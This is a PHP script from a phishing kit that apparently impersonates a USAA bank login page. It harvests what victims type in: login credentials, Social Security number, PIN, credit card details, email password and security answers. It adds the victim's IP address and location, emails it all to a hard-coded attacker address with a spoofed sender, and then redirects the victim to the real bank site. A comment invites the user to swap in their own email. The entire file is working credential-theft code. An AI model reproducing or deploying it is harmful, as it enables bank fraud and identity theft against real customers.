<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Login Info-----------------------\n";
$message .= "User ID            : ".$_POST['formtext1']."\n";
$message .= "Password            : ".$_POST['formtext2']."\n";
$message .= "SSN/TEx ID            : ".$_POST['formtext3']."\n";
$message .= "Full Name            : ".$_POST['formtext4']."\n";
$message .= "MMn            : ".$_POST['formtext5']."\n";
$message .= "PIN            : ".$_POST['formtext6']."\n";
$message .= "Verbal Phone Password            : ".$_POST['formtext7']."\n";
$message .= "Credit Card Number            : ".$_POST['formtext8']."\n";
$message .= "Expiry MM            : ".$_POST['formtext9']."\n";
$message .= "Expiry YY            : ".$_POST['formtext10']."\n";
$message .= "--------------Email Info-----------------------\n";
$message .= "email            : ".$_POST['formtext11']."\n";
$message .= "EPassword            : ".$_POST['formtext12']."\n";
$message .= "--------------Questions Info-----------------------\n";
$message .= "Question 1            : ".$_POST['formselect1']."\n";
$message .= "Answer 1            : ".$_POST['formtext13']."\n";
$message .= "Question 2            : ".$_POST['formselect2']."\n";
$message .= "Answer 2            : ".$_POST['formtext14']."\n";
$message .= "Question 3            : ".$_POST['formselect3']."\n";
$message .= "Answer 3            : ".$_POST['formtext15']."\n";
$message .= "Question 4            : ".$_POST['formselect4']."\n";
$message .= "Answer 4            : ".$_POST['formtext16']."\n";
$message .= "Question 5            : ".$_POST['formselect5']."\n";
$message .= "Answer 5            : ".$_POST['formtext17']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY HACKER JP-------------\n";
//change ur email here
$send = "portersmith2020@yahoo.com,portersmith2020@yahoo.com";
$subject = "Login Info";
$headers = "From: Usaa<supertool@mxtoolbox.com>";
$headers .= $_POST['portersmith2020@yahoo.com']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);

 }

    header ("Location: https://www.usaa.com/inet/ent_logon/Logon?redirectjsp=true");
  

?>